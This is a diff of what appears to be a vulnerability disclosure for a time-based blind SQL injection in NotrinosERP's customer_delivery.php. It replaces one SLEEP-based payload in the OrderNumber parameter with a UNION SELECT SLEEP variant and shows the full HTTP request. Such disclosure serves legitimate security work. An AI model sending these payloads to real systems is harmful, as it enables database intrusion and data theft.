@@ -41,10 +41,10 @@ Sec-Fetch-Site: same-origin
 Sec-Fetch-User: ?1
 ```
 
-The following malicious request with OrderNumber parameter set to `10+OR+SLEEP(1)%23` will take around 14000 milis (14 seconds) response time.
+The following malicious request with OrderNumber parameter set to `10+UNION+SELECT+SLEEP(2)%23--+-` will take around 2000 milis (2 seconds) response time.
 
 ```
-GET /NotrinosERP/sales/customer_delivery.php?OrderNumber=10+OR+SLEEP(1)%23 HTTP/1.1
+GET /NotrinosERP/sales/customer_delivery.php?OrderNumber=10+UNION+SELECT+SLEEP(2)%23--+- HTTP/1.1
 Host: localhost
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
